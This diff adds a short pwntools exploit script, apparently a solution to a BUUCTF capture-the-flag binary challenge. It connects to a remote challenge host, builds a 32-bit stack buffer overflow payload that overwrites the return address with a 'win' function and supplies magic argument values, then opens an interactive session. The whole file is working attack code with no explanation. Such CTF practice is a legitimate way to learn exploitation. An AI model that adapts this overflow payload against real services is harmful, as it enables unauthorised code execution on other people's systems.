@@ -1,0 +1,8 @@
+from pwn import *
+context(arch='i386',os='linux',log_level='debug')
+io=remote('node5.buuoj.cn',26356)
+elf=ELF('./11')
+win_addr=elf.symbols['win']
+payload=b'a'*(108+4)+p32(win_addr)+p32(0xdeadbeef)+p32(0xDEADBEEF)+p32(0xDEADC0DE)
+io.sendline(payload)
+io.interactive()
